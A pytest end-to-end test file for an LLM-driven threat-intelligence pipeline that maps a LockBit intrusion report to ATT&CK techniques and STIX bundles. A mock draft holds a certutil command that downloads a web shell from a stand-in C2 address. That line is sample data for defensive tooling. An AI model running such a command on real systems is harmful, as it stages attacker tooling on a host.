"""End-to-end integration test: full pipeline with real Postgres + checkpointer.

Unlike test_integration.py (which calls nodes one-by-one with dict state),
this test uses the actual compiled LangGraph with:
  - Real AsyncPostgresSaver checkpointer (persists state across gate interrupts)
  - Real SQLAlchemy source queue (Postgres)
  - LLM calls mocked (we're testing infrastructure, not prompt quality)
  - Neo4j writes disabled (distribute runs in dry-run mode)

Prerequisites:
  - Docker Compose stack running: postgres + neo4j + api
  - Or: just Postgres available at the DATABASE_URL in .env

Run:
    pytest tests/test_e2e.py -v --asyncio-mode=auto
"""

from __future__ import annotations

import asyncio
import copy
import os
import uuid
from unittest.mock import AsyncMock, patch

import pytest

# Ensure backend is importable
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent / "backend"))

from app.config import settings
from app.graph.pipeline import compile_pipeline
from app.graph.state import (
    Channel,
    GateAction,
    PipelineStatus,
    SourceType,
)
from app.nodes.llm.errors import LLMValidationError
from app.nodes.llm.llm_adapter import LLMResponse


# =============================================================================
# Skip if Postgres is not reachable
# =============================================================================

def _pg_available() -> bool:
    """Quick check: can we connect to Postgres?"""
    try:
        import psycopg
        conn_str = settings.database_url.replace("+asyncpg", "")
        with psycopg.connect(conn_str, connect_timeout=3) as conn:
            conn.execute("SELECT 1")
        return True
    except Exception:
        return False


requires_postgres = pytest.mark.skipif(
    not _pg_available(),
    reason="Postgres not reachable (is Docker running?)",
)


@pytest.fixture(scope="session", autouse=True)
def _create_app_tables():
    """Give a bare database the app's schema before any test touches a row.

    In development the api container runs ``Base.metadata.create_all`` at
    startup, so the tables are simply there. CI provides an empty Postgres
    and no running api, and without this every test that writes a source
    row failed with 'relation "sources" does not exist' while the LLM
    cache logged a read failure per call. Idempotent (create_all skips
    tables that exist) and a no-op when Postgres is unreachable, since
    every test that needs it is already skipped in that case.

    A private engine, not the app's shared one: the shared pool would be
    bound to this fixture's event loop and the first test to reuse a
    connection would fail with "attached to a different loop".
    """
    if not _pg_available():
        return
    from sqlalchemy.ext.asyncio import create_async_engine
    import app.models  # noqa: F401 — registers every table on Base.metadata
    from app.models.base import Base

    async def _create() -> None:
        eng = create_async_engine(settings.database_url)
        try:
            async with eng.begin() as conn:
                await conn.run_sync(Base.metadata.create_all)
        finally:
            await eng.dispose()

    asyncio.run(_create())


@pytest.fixture(autouse=True)
async def _dispose_engine_pool_between_tests():
    """Dispose the shared async engine's connection pool after each test.

    The app uses a module-level async engine with a QueuePool. Under
    pytest-asyncio asyncio_mode=auto each test runs in its own event loop,
    so a pooled asyncpg connection created in one test's loop and reused
    by the next test raises "got Future attached to a different loop". The
    real-DB e2e tests in this module run consecutively, so dispose the pool
    after each (in that test's own loop) and the next test gets fresh
    connections bound to its loop. No-op for the LLM-mocked tests that
    never check out a connection.
    """
    yield
    from app.models.base import engine
    await engine.dispose()


# =============================================================================
# Helpers
# =============================================================================

def _llm_response(tool_input: dict) -> LLMResponse:
    """Build a mock LLMResponse."""
    return LLMResponse(
        tool_output=tool_input,
        raw_text="",
        model="mock-e2e",
        input_tokens=100,
        output_tokens=50,
        stop_reason="end_turn",
    )


def _mock_entities():
    return _llm_response({
        "entities": [
            {"value": "LockBit 3.0", "entity_type": "intrusion_set", "confidence": 0.95,
             "context_snippet": "LockBit 3.0 ransomware actors exploited CVE-2023-46604"},
            {"value": "Cobalt Strike", "entity_type": "malware", "confidence": 0.88,
             "context_snippet": "download and execute a Cobalt Strike beacon"},
            {"value": "certutil.exe", "entity_type": "tool", "confidence": 0.92,
             "context_snippet": "used certutil.exe to download a web shell"},
            {"value": "203.0.113.10", "entity_type": "ioc_ip", "confidence": 0.99,
             "context_snippet": "C2 server at 203.0.113.10"},
            {"value": "CVE-2023-46604", "entity_type": "vulnerability", "confidence": 1.0,
             "context_snippet": "exploited CVE-2023-46604"},
        ],
        "detection_rules": [],
    })


def _mock_classify():
    # Field name MUST match ClassifySectionsOutput → classification_confidence.
    # Prior mocks used plain "confidence" which now fails Pydantic validation.
    #
    # The classifier addresses sections by line range instead of echoing text
    # (see chunking._classify_sections), so this claims the whole document as
    # one behavioral section. end_line is deliberately far past any fixture's
    # real length — _resolve_section_ranges clamps it to the last line, which
    # keeps the mock independent of fixture size.
    return _llm_response({
        "sections": [{
            "start_line": 1,
            "end_line": 100_000,
            "classification": "behavioral_narrative",
            "classification_confidence": 0.95,
        }],
    })


def _mock_chunks():
    # ChunkBehaviorsOutput requires behavioral_confidence, not confidence.
    return _llm_response({
        "chunks": [
            {"text": "LockBit 3.0 actors exploited CVE-2023-46604 in Apache ActiveMQ for initial access.",
             "sequence_index": 1, "predecessor_indices": [], "branch_point": False,
             "convergence_point": False, "behavioral_confidence": 0.90},
            {"text": "Used certutil.exe to download a web shell from C2 at 203.0.113.10.",
             "sequence_index": 2, "predecessor_indices": [1], "branch_point": False,
             "convergence_point": False, "behavioral_confidence": 0.85},
            {"text": "PowerShell downloaded and executed a Cobalt Strike beacon for C2.",
             "sequence_index": 3, "predecessor_indices": [2], "branch_point": False,
             "convergence_point": False, "behavioral_confidence": 0.80},
        ],
    })


# Source quotes MUST be verbatim substrings of the chunk texts in
# _mock_chunks() above. The C+A+D pick step auto-caps any pick whose
# source_quote isn't a verbatim substring to bucket=possible/conf<=0.6,
# routing it to technique_mappings_for_review instead of technique_mappings.
_TECHNIQUE_DATA = [
    ("T1190", "Exploit Public-Facing Application", "initial-access", 0.90,
     "Exploitation of a public-facing Apache ActiveMQ for initial access.",
     "Gain initial access by exploiting Apache ActiveMQ.",
     "Exploit a public-facing Apache ActiveMQ instance to gain initial access.",
     "actors exploited CVE-2023-46604 in Apache ActiveMQ"),
    ("T1105", "Ingress Tool Transfer", "command-and-control", 0.85,
     "certutil.exe used to transfer a web shell from the C2 server.",
     "Download and stage a web shell on the compromised host.",
     "Use certutil.exe to transfer a web shell payload from C2 onto the target.",
     "Used certutil.exe to download a web shell from C2"),
    ("T1059.001", "PowerShell", "execution", 0.82,
     "PowerShell invoked to download and execute a Cobalt Strike beacon.",
     "Execute Cobalt Strike beacon for command-and-control.",
     "Use PowerShell to download and execute a Cobalt Strike beacon for C2.",
     "PowerShell downloaded and executed a Cobalt Strike beacon"),
]


def _mock_propose_techniques(chunk_ids: list[str]):
    """C+A+D propose step: per-chunk objective + behavior + proposed T-IDs."""
    chunk_proposals = []
    for i, cid in enumerate(chunk_ids):
        tid, _tname, tactic, _conf, _rationale, behavior, objective, _quote = _TECHNIQUE_DATA[i]
        chunk_proposals.append({
            "chunk_id": cid,
            "behavior_description": behavior,
            "objective": objective,
            "tactics": [tactic],
            "proposed_techniques": [tid],
        })
    return _llm_response({"chunk_proposals": chunk_proposals})


def _mock_techniques(chunk_ids: list[str]):
    """C+A+D pick step: per-chunk picks with bucket + source_quote + rationale."""
    chunk_techniques = []
    for i, cid in enumerate(chunk_ids):
        tid, tname, tactic, conf, rationale, _behavior, _objective, quote = _TECHNIQUE_DATA[i]
        chunk_techniques.append({
            "chunk_id": cid,
            "techniques": [{
                "technique_id": tid, "technique_name": tname,
                "tactic": tactic, "confidence": conf,
                "rationale": rationale,
                "confidence_bucket": "definite",
                "source_quote": quote,
            }],
        })
    return _llm_response({"chunk_techniques": chunk_techniques})


def _mock_drafts(chunk_ids: list[str]):
    # DraftItem has no `confidence` field — uses `detail_gap: bool`.
    # extra='forbid' on the model now rejects the legacy confidence key.
    drafts = [
        {"chunk_id": chunk_ids[0],
         "name": "Exploit Apache ActiveMQ via CVE-2023-46604",
         "description": "The threat actor exploited CVE-2023-46604 RCE vulnerability in Apache ActiveMQ.",
         "platforms": ["linux::server", "windows::server"],
         "command_lines": [], "detail_gap": False},
        {"chunk_id": chunk_ids[1],
         "name": "Download web shell via certutil",
         "description": "The actor used certutil.exe to transfer a JSP web shell from the C2 server.",
         "platforms": ["windows::server"],
         "command_lines": ["certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp"],
         "detail_gap": False},
        {"chunk_id": chunk_ids[2],
         "name": "Execute Cobalt Strike beacon via PowerShell",
         "description": "PowerShell was used to download and execute a Cobalt Strike beacon.",
         "platforms": ["windows::server"],
         "command_lines": [], "detail_gap": True},
    ]
    return _llm_response({"drafts": drafts})


# =============================================================================
# Fixtures
# =============================================================================

@pytest.fixture
def sample_text():
    return (
        "LockBit 3.0 ransomware actors exploited CVE-2023-46604, a remote code "
        "execution vulnerability in Apache ActiveMQ, to gain initial access to "
        "healthcare networks. Following exploitation, the actors used certutil.exe "
        "to download a web shell from their C2 server at 203.0.113.10. The web "
        "shell was placed in the ActiveMQ webapps directory. Subsequently, PowerShell "
        "was used to download and execute a Cobalt Strike beacon, establishing "
        "persistent command and control. The actors then used Mimikatz for credential "
        "harvesting before deploying LockBit ransomware across the network."
    )


@pytest.fixture
async def checkpointer():
    """Create a real AsyncPostgresSaver connected to Docker Postgres."""
    from langgraph.checkpoint.postgres.aio import AsyncPostgresSaver

    conn_string = settings.database_url.replace("+asyncpg", "")
    cm = AsyncPostgresSaver.from_conn_string(conn_string)
    saver = await cm.__aenter__()
    await saver.setup()
    try:
        yield saver
    finally:
        await cm.__aexit__(None, None, None)


@pytest.fixture
async def compiled_graph(checkpointer):
    """Compile the pipeline with a real checkpointer and gate interrupts."""
    # No interrupt_before override on purpose. This list was pinned before
    # gate_chunks existed, so the fixture silently stopped pausing at it —
    # the same stale-list mistake that once let gate_chunks run inline in
    # main.py. compile_pipeline's default is what production uses, and
    # test_graph_execution.py asserts that default covers every registered
    # gate, so tracking it here cannot go stale again.
    return compile_pipeline(checkpointer=checkpointer)


@pytest.fixture
async def compiled_graph_no_interrupts(checkpointer):
    """Compile pipeline WITHOUT gate interrupts (for auto-skip tests)."""
    return compile_pipeline(
        checkpointer=checkpointer,
        interrupt_before=[],
    )


# =============================================================================
# E2E Test: Full pipeline with auto-skip gates
# =============================================================================

@requires_postgres
class TestE2EPipeline:
    """Full pipeline run through the compiled LangGraph with real Postgres."""

    @pytest.mark.asyncio
    async def test_full_pipeline_gates_disabled(
        self, compiled_graph_no_interrupts, sample_text
    ):
        """Run the entire pipeline with every gate disabled (auto-approve).

        Uses a graph compiled WITHOUT interrupt_before so the pipeline
        runs end-to-end without pausing at gates. Gates still execute
        their auto-approve logic when disabled.
        """
        graph = compiled_graph_no_interrupts
        thread_id = str(uuid.uuid4())
        config = {"configurable": {"thread_id": thread_id}}

        initial_state = {
            "source_id": f"e2e-{thread_id[:8]}",
            "channel": Channel.MANUAL.value,
            "source_type": SourceType.FREE_TEXT.value,
            "raw_content_path": sample_text,
            "metadata": {
                "author": "DFIR Report",
                "publication_date": "2023-11-15",
            },
            "source_reliability": 85,
            "gates_enabled": False,
            "status": "parsing",
            "current_node": "parse_and_validate",
        }

        # The chunk IDs are assigned dynamically by the chunking node (chk-XXXX).
        # The technique and draft mocks need those IDs. We capture them by
        # patching _process_technique_mappings and the drafting node's internal
        # processing to use the real chunk IDs.
        #
        # Strategy: use a shared list that gets populated when chunking finishes.
        # The technique mock reads chunk IDs from the LLM prompt text (which
        # includes chunk IDs). But simpler: use a wrapper that intercepts the
        # call_llm args which include the prompt containing chunk IDs, then
        # parse them out.
        #
        # Simplest: patch call_llm globally and dispatch based on tool_choice.

        _chunk_call_count = {"n": 0}
        _captured_chunk_ids = []

        def _universal_llm_mock(*args, **kwargs):
            """Single mock for all call_llm invocations. Dispatches by tool name."""
            import re

            tool_choice = kwargs.get("tool_choice", {})
            tool_name = tool_choice.get("name", "") if isinstance(tool_choice, dict) else ""

            if tool_name == "extract_entities":
                return _mock_entities()

            elif tool_name == "classify_sections":
                return _mock_classify()

            elif tool_name == "chunk_behaviors":
                return _mock_chunks()

            elif tool_name in ("propose_techniques", "extract_techniques"):
                # C+A+D flow: propose_techniques fires first (per-chunk objective +
                # proposed T-IDs), then extract_techniques fires for the picking
                # step. Both calls share the same chunk_id capture logic.
                messages = kwargs.get("messages", args[1] if len(args) > 1 else [])
                prompt_text = ""
                for m in messages:
                    if isinstance(m, dict):
                        prompt_text += m.get("content", "")
                chunk_ids = re.findall(r"chk-[a-f0-9]+", prompt_text)
                if not chunk_ids:
                    chunk_ids = _captured_chunk_ids
                if not _captured_chunk_ids and chunk_ids:
                    _captured_chunk_ids.extend(chunk_ids[:3])
                ids = chunk_ids[:3] if chunk_ids else ["chk-001", "chk-002", "chk-003"]
                if tool_name == "propose_techniques":
                    return _mock_propose_techniques(ids)
                return _mock_techniques(ids)

            elif tool_name == "draft_procedures":
                chunk_ids = _captured_chunk_ids or ["chk-001", "chk-002", "chk-003"]
                return _mock_drafts(chunk_ids[:3])

            else:
                # Fallback: classify or chunk based on call count
                _chunk_call_count["n"] += 1
                if _chunk_call_count["n"] % 2 == 1:
                    return _mock_classify()
                else:
                    return _mock_chunks()

        # ── Run the pipeline with all LLM calls mocked ─────────────────
        with patch("app.nodes.llm.entity_extraction.call_llm", new_callable=AsyncMock, side_effect=_universal_llm_mock), \
             patch("app.nodes.llm.chunking.call_llm", new_callable=AsyncMock, side_effect=_universal_llm_mock), \
             patch("app.nodes.llm.technique_extraction.call_llm", new_callable=AsyncMock, side_effect=_universal_llm_mock), \
             patch("app.nodes.llm.drafting.call_llm", new_callable=AsyncMock, side_effect=_universal_llm_mock):
            async for event in graph.astream(initial_state, config):
                # Capture chunk IDs as they appear in state
                snap = await graph.aget_state(config)
                if snap and snap.values:
                    chunks = snap.values.get("chunks", [])
                    if chunks and not _captured_chunk_ids:
                        _captured_chunk_ids.extend(
                            c["chunk_id"] for c in chunks
                        )

        # ── Verify final state ──────────────────────────────────────────
        final_state = await graph.aget_state(config)
        assert final_state is not None
        state = final_state.values

        # Pipeline completed
        assert state["status"] in (
            PipelineStatus.DISTRIBUTING.value,
            PipelineStatus.COMPLETED.value,
        ), f"Unexpected final status: {state['status']}"

        # All nodes produced output
        assert len(state.get("entities", [])) == 5, "Expected 5 entities"
        assert len(state.get("validated_entities", [])) == 5, "Expected 5 validated entities"
        assert len(state.get("chunks", [])) == 3, "Expected 3 chunks"
        assert len(state.get("technique_mappings", {})) > 0, "Expected technique mappings"
        assert len(state.get("drafts", [])) == 3, "Expected 3 drafts"
        assert len(state.get("normalized_drafts", [])) == 3, "Expected 3 normalized drafts"

        # Gate decisions were auto-applied
        assert all(
            v["gate_action"] == GateAction.APPROVE.value
            for v in state["validated_entities"]
        ), "All entities should be auto-approved"
        assert state["gate2_decision"]["approved"] is True

        # STIX bundle was produced
        bundle = state.get("stix_bundle")
        assert bundle is not None, "No STIX bundle produced"
        assert bundle["type"] == "bundle"
        assert len(bundle["objects"]) > 0

        obj_types = {obj["type"] for obj in bundle["objects"]}
        assert "identity" in obj_types, "Bundle missing source identity"
        assert "x-procedure" in obj_types, "Bundle missing procedures"
        assert "relationship" in obj_types, "Bundle missing relationships"

        # Validation passed
        validation = state.get("validation_results", {})
        assert validation.get("schema") is True, f"Schema validation failed: {validation}"

        # State was persisted (we can read it back from checkpointer)
        re_read = await graph.aget_state(config)
        assert re_read is not None
        assert re_read.values["source_id"] == state["source_id"]

    @pytest.mark.asyncio
    async def test_gate_interrupt_and_resume(
        self, compiled_graph, sample_text
    ):
        """Run pipeline WITH gates enabled, verify it pauses at gate_0,
        then manually resume and verify it continues to gate_1.

        This tests the real LangGraph interrupt/resume mechanism with
        a real Postgres checkpointer.
        """
        graph = compiled_graph
        thread_id = str(uuid.uuid4())
        config = {"configurable": {"thread_id": thread_id}}

        initial_state = {
            "source_id": f"e2e-gate-{thread_id[:8]}",
            "channel": Channel.MANUAL.value,
            "source_type": SourceType.FREE_TEXT.value,
            "raw_content_path": sample_text,
            "metadata": {"author": "Test"},
            "source_reliability": 85,
            "gates_enabled": True,  # Gates active
            "status": "parsing",
            "current_node": "parse_and_validate",
        }

        # Phase 1: Run until gate_0 interrupt. classify_sections is its own
        # node ahead of extract_entities and calls chunking's call_llm, so it
        # needs its own mock — locally the LLM cache table hid that gap by
        # serving a cached response; CI has no such table.
        with patch("app.nodes.llm.entity_extraction.call_llm", new_callable=AsyncMock, return_value=_mock_entities()), \
             patch("app.nodes.llm.chunking.call_llm", new_callable=AsyncMock, return_value=_mock_classify()):
            events = []
            async for event in graph.astream(initial_state, config):
                events.append(event)

        # Should have paused before gate_0
        state_snapshot = await graph.aget_state(config)
        assert state_snapshot is not None
        state = state_snapshot.values
        assert state["status"] == PipelineStatus.EXTRACTING_ENTITIES.value
        assert len(state["entities"]) == 5

        # Verify the graph is actually paused at gate_0
        next_tasks = state_snapshot.next
        assert "gate_0" in next_tasks, f"Expected pause at gate_0, got: {next_tasks}"

        # Phase 2: Simulate analyst approval and resume
        # Disable every gate (legacy bool shape) so all subsequent gates
        # auto-approve. But interrupt_before is compile-time, so the graph
        # will still pause before each remaining gate. We loop resume until done.
        await graph.aupdate_state(
            config,
            {"gates_enabled": False},
        )

        # Track chunks for downstream mocks
        import re as _re
        _captured_chunk_ids_gate = []

        def _gate_llm_mock(*args, **kwargs):
            """Universal mock for resume phase LLM calls."""
            tool_choice = kwargs.get("tool_choice", {})
            tool_name = tool_choice.get("name", "") if isinstance(tool_choice, dict) else ""

            if tool_name == "classify_sections":
                return _mock_classify()
            elif tool_name == "chunk_behaviors":
                return _mock_chunks()
            elif tool_name in ("propose_techniques", "extract_techniques"):
                messages = kwargs.get("messages", args[1] if len(args) > 1 else [])
                prompt_text = ""
                for m in messages:
                    if isinstance(m, dict):
                        prompt_text += m.get("content", "")
                chunk_ids = _re.findall(r"chk-[a-f0-9]+", prompt_text)
                if not _captured_chunk_ids_gate and chunk_ids:
                    _captured_chunk_ids_gate.extend(chunk_ids[:3])
                ids = chunk_ids[:3] if chunk_ids else _captured_chunk_ids_gate or ["chk-001", "chk-002", "chk-003"]
                if tool_name == "propose_techniques":
                    return _mock_propose_techniques(ids)
                return _mock_techniques(ids)
            elif tool_name == "draft_procedures":
                ids = _captured_chunk_ids_gate or ["chk-001", "chk-002", "chk-003"]
                return _mock_drafts(ids[:3])
            else:
                return _mock_classify()

        # Resume loop: keep resuming until no more interrupts
        with patch("app.nodes.llm.entity_extraction.call_llm", new_callable=AsyncMock, side_effect=_gate_llm_mock), \
             patch("app.nodes.llm.chunking.call_llm", new_callable=AsyncMock, side_effect=_gate_llm_mock), \
             patch("app.nodes.llm.technique_extraction.call_llm", new_callable=AsyncMock, side_effect=_gate_llm_mock), \
             patch("app.nodes.llm.drafting.call_llm", new_callable=AsyncMock, side_effect=_gate_llm_mock):

            # Derived from the gate registry rather than hardcoded: this was
            # 5, which happened to be just enough once gate_chunks started
            # pausing (4 resumes needed). A fifth gate would have silently
            # exhausted the loop and failed downstream with a confusing
            # error instead of an obvious one.
            from app.api.routes._gate_registry import GATES

            max_resumes = len(GATES) + 3
            paused_at: list[str] = []
            completed = False
            for _ in range(max_resumes):
                async for event in graph.astream(None, config):
                    # Capture chunk IDs when they appear
                    snap = await graph.aget_state(config)
                    if snap and snap.values:
                        chunks = snap.values.get("chunks", [])
                        if chunks and not _captured_chunk_ids_gate:
                            _captured_chunk_ids_gate.extend(
                                c["chunk_id"] for c in chunks
                            )

                # Check if pipeline is done or still interrupted
                snap = await graph.aget_state(config)
                if not snap.next:
                    completed = True
                    break  # No more interrupts, pipeline complete
                paused_at.append(snap.next[0])

        assert completed, (
            f"resume loop exhausted after {max_resumes} attempts, still paused "
            f"at {paused_at[-1] if paused_at else '?'} (sequence: {paused_at})"
        )
        # The chunk gate must actually be exercised. The fixture used to pin
        # interrupt_before to a list written before gate_chunks existed, so
        # this test silently never paused there.
        assert "gate_chunks" in paused_at, (
            f"never paused at gate_chunks; saw {paused_at}"
        )

        # Should have completed the full pipeline
        final = await graph.aget_state(config)
        state = final.values
        assert state["status"] in (
            PipelineStatus.DISTRIBUTING.value,
            PipelineStatus.COMPLETED.value,
        ), f"Pipeline didn't complete after resume. Status: {state['status']}"
        assert state.get("stix_bundle") is not None, "No STIX bundle after resume"

    @pytest.mark.asyncio
    async def test_checkpointer_persistence(self, compiled_graph, sample_text):
        """Verify state survives across separate graph reads.

        Simulates: pipeline pauses at gate, server restarts, state is
        still readable from Postgres.
        """
        graph = compiled_graph
        thread_id = str(uuid.uuid4())
        config = {"configurable": {"thread_id": thread_id}}

        initial_state = {
            "source_id": f"e2e-persist-{thread_id[:8]}",
            "channel": Channel.MANUAL.value,
            "source_type": SourceType.FREE_TEXT.value,
            "raw_content_path": sample_text,
            "metadata": {},
            "source_reliability": 50,
            "gates_enabled": True,
            "status": "parsing",
            "current_node": "parse_and_validate",
        }

        # Run until first gate interrupt (classify_sections precedes the
        # entity extractor and has its own call_llm — see test above).
        with patch("app.nodes.llm.entity_extraction.call_llm", new_callable=AsyncMock, return_value=_mock_entities()), \
             patch("app.nodes.llm.chunking.call_llm", new_callable=AsyncMock, return_value=_mock_classify()):
            async for _ in graph.astream(initial_state, config):
                pass

        # Read state back (simulates a fresh API request after server restart)
        recovered = await graph.aget_state(config)
        assert recovered is not None
        assert recovered.values["source_id"] == initial_state["source_id"]
        assert len(recovered.values["entities"]) == 5
        assert "gate_0" in recovered.next

    @pytest.mark.asyncio
    async def test_api_pipeline_run_endpoint(self, sample_text):
        """Test the /api/pipeline/run endpoint via the live Docker API.

        Requires the Docker stack to be running. Hits the real HTTP
        endpoints to verify the full request lifecycle.
        """
        import httpx

        base = "http://localhost:8000"

        async with httpx.AsyncClient(base_url=base, timeout=10, follow_redirects=True) as client:
            # Health check first.
            #
            # A TIMEOUT counts as unreachable, not as a failure. The pipeline
            # blocks the event loop for minutes while SecureBERT encodes the
            # 697-technique catalogue, and during that window /health does not
            # return non-200 — it does not return at all. Letting that raise
            # made this test fail whenever anything else was running, and it
            # read as a regression in whatever was being built at the time.
            #
            # Connection refused (nothing listening, as in CI) is the same
            # verdict: unreachable, skip. httpx.HTTPError covers both.
            try:
                health = await client.get("/health")
            except httpx.TimeoutException:
                pytest.skip("API at localhost:8000 is busy (health check timed out)")
            except httpx.HTTPError as exc:
                pytest.skip(f"API not reachable at localhost:8000 ({type(exc).__name__})")
            if health.status_code != 200:
                pytest.skip("API not reachable at localhost:8000")

            # Create a source
            create_resp = await client.post(
                "/api/sources/",
                json={
                    "title": "E2E Test Source",
                    "source_type": "free_text",
                    "raw_content_path": "/data/e2e-test.txt",
                },
            )
            assert create_resp.status_code == 201, f"Source creation failed: {create_resp.text}"
            source = create_resp.json()
            source_id = source["id"]
            assert source["status"] == "queued"

            try:
                # Trigger pipeline run (gates disabled)
                run_resp = await client.post(
                    "/api/pipeline/run/",
                    json={
                        "source_id": source_id,
                        "gates_enabled": False,
                    },
                )
                assert run_resp.status_code == 202, f"Pipeline run failed: {run_resp.text}"
                data = run_resp.json()
                assert "thread_id" in data
                assert data["source_id"] == source_id
                assert data["status"] == "parsing"
            finally:
                # Delete through the API, not raw SQL.
                #
                # This test drives the LIVE container, so the autouse conftest
                # guard that stops the suite writing into the feedback ledger
                # runs in the wrong process and cannot reach these writes. The
                # cleanup is therefore the only thing standing between this
                # test and permanent residue.
                #
                # `DELETE FROM sources` removed the row and left everything
                # keyed to it behind: `feedback_pattern_surfacings` holds plain
                # UUIDs with no cascade, and `queue.delete_source` is what
                # reclaims them. Going around it made this test a generator of
                # exactly the orphan rows an audit found, where 131
                # of 140 source ids pointed at sources that no longer existed.
                #
                # `finally`, because an assertion above used to leak the source
                # entirely.
                del_resp = await client.delete(f"/api/sources/{source_id}")
                assert del_resp.status_code in (200, 204), (
                    f"cleanup failed, source {source_id} and its ledger rows "
                    f"are now orphaned: {del_resp.status_code} {del_resp.text}"
                )


# =============================================================================
# Pipeline-route failure path tests (chunking)
# =============================================================================

@requires_postgres
class TestPipelineRoutes:
    """Exercise the pipeline background task's failure handling.

    These tests run the real `_run_pipeline` function (not the HTTP route)
    so we can control the LLM mocks and read source rows directly. The
    HTTP layer adds nothing we haven't covered in test_api endpoints —
    what matters here is that chunking failures land the source in
    status='failed' with a populated error column.
    """

    @staticmethod
    def _mock_chunks_empty():
        """Return a ChunkBehaviorsOutput with zero chunks — passes Pydantic
        validation (empty list is legal) but trips the zero-chunks hard-fail
        when behavioral text >= 200 chars."""
        return _llm_response({"chunks": []})

    @pytest.mark.asyncio
    async def test_chunking_failure_sets_source_failed_and_populates_error(
        self, compiled_graph_no_interrupts, sample_text
    ):
        """LLMValidationError in chunking → source.status='failed' with
        source.error populated. The outer pipeline try/except must
        forward the exception string to the queue row so the analyst
        sees a red badge with a reason."""
        from app.api.routes.pipeline import _run_pipeline
        from app.models.base import async_session
        from app.services import queue as queue_service

        graph = compiled_graph_no_interrupts

        # Create a real source row so _run_pipeline has something to update.
        async with async_session() as db:
            source = await queue_service.create_source(
                db,
                source_type=SourceType.FREE_TEXT.value,
                title="chunking-fail test",
                raw_content_path=sample_text,
                channel=Channel.MANUAL.value,
                gates_enabled=False,
                source_reliability=50,
            )
            source_id = source.id
            thread_id = str(source_id)

        initial_state = {
            "source_id": str(source_id),
            "channel": Channel.MANUAL.value,
            "source_type": SourceType.FREE_TEXT.value,
            "raw_content_path": sample_text,
            "metadata": {},
            "source_reliability": 50,
            "gates_enabled": False,
            "status": "parsing",
            "current_node": "parse_and_validate",
        }

        def _chunking_raises(*args, **kwargs):
            """Simulate Pydantic-exhausted retry in chunking only."""
            tool_choice = kwargs.get("tool_choice", {})
            tool_name = (
                tool_choice.get("name", "") if isinstance(tool_choice, dict) else ""
            )
            if tool_name == "classify_sections":
                return _mock_classify()
            if tool_name == "chunk_behaviors":
                raise LLMValidationError(
                    tool_name="chunk_behaviors",
                    errors=[{
                        "loc": ("chunks", 0),
                        "msg": "Input should be a valid dictionary",
                        "type": "dict_type",
                    }],
                    raw_output={"chunks": ["bare-string-leak"]},
                    attempts=2,
                )
            # Should not be reached (pipeline should fail before techniques/drafts).
            raise AssertionError(f"Unexpected tool call: {tool_name}")

        try:
            with patch(
                "app.nodes.llm.entity_extraction.call_llm",
                return_value=_mock_entities(),
            ), patch(
                "app.nodes.llm.chunking.call_llm",
                side_effect=_chunking_raises,
            ):
                await _run_pipeline(graph, thread_id, initial_state, source_id)

            # Re-read the source — status should be 'failed' with error populated
            async with async_session() as db:
                refreshed = await queue_service.get_source(db, source_id)

            assert refreshed is not None
            assert refreshed.status == "failed", (
                f"Expected status='failed', got '{refreshed.status}'"
            )
            assert refreshed.error, "Expected source.error to be populated"
            # Error should name the chunking step and reflect the validation
            # failure, so an analyst staring at the red badge knows why.
            err = refreshed.error.lower()
            assert "chunk" in err or "validation" in err, (
                f"Error string doesn't mention chunk/validation: {refreshed.error}"
            )
        finally:
            # Cleanup — delete the source row we created.
            async with async_session() as db:
                await queue_service.delete_source(db, source_id)

    @pytest.mark.asyncio
    async def test_chunking_zero_chunks_hard_fails(
        self, compiled_graph_no_interrupts, sample_text
    ):
        """Chunking returns an empty `chunks` array despite >=200 chars of
        behavioral text → hard fail. Without the guard, gate_1 would open
        with nothing in it and the analyst would stare at an empty queue
        wondering why. With the guard, the source lands in 'failed' and
        the error names the condition."""
        from app.api.routes.pipeline import _run_pipeline
        from app.models.base import async_session
        from app.services import queue as queue_service

        graph = compiled_graph_no_interrupts

        async with async_session() as db:
            source = await queue_service.create_source(
                db,
                source_type=SourceType.FREE_TEXT.value,
                title="zero-chunks test",
                raw_content_path=sample_text,
                channel=Channel.MANUAL.value,
                gates_enabled=False,
                source_reliability=50,
            )
            source_id = source.id
            thread_id = str(source_id)

        initial_state = {
            "source_id": str(source_id),
            "channel": Channel.MANUAL.value,
            "source_type": SourceType.FREE_TEXT.value,
            "raw_content_path": sample_text,
            "metadata": {},
            "source_reliability": 50,
            "gates_enabled": False,
            "status": "parsing",
            "current_node": "parse_and_validate",
        }

        def _zero_chunks_mock(*args, **kwargs):
            tool_choice = kwargs.get("tool_choice", {})
            tool_name = (
                tool_choice.get("name", "") if isinstance(tool_choice, dict) else ""
            )
            if tool_name == "classify_sections":
                # Return a long behavioral section — guaranteed above the
                # _MIN_BEHAVIORAL_CHARS_FOR_HARD_FAIL=200 threshold.
                return _mock_classify()
            if tool_name == "chunk_behaviors":
                return TestPipelineRoutes._mock_chunks_empty()
            raise AssertionError(f"Unexpected tool call: {tool_name}")

        try:
            with patch(
                "app.nodes.llm.entity_extraction.call_llm",
                return_value=_mock_entities(),
            ), patch(
                "app.nodes.llm.chunking.call_llm",
                side_effect=_zero_chunks_mock,
            ):
                await _run_pipeline(graph, thread_id, initial_state, source_id)

            async with async_session() as db:
                refreshed = await queue_service.get_source(db, source_id)

            assert refreshed is not None
            assert refreshed.status == "failed", (
                f"Expected status='failed', got '{refreshed.status}'"
            )
            assert refreshed.error, "Expected source.error to be populated"
            err = refreshed.error.lower()
            # The RuntimeError message from chunking.py mentions "zero chunks".
            assert "zero chunks" in err or "0 chunks" in err, (
                f"Error should mention zero chunks: {refreshed.error}"
            )
        finally:
            async with async_session() as db:
                await queue_service.delete_source(db, source_id)
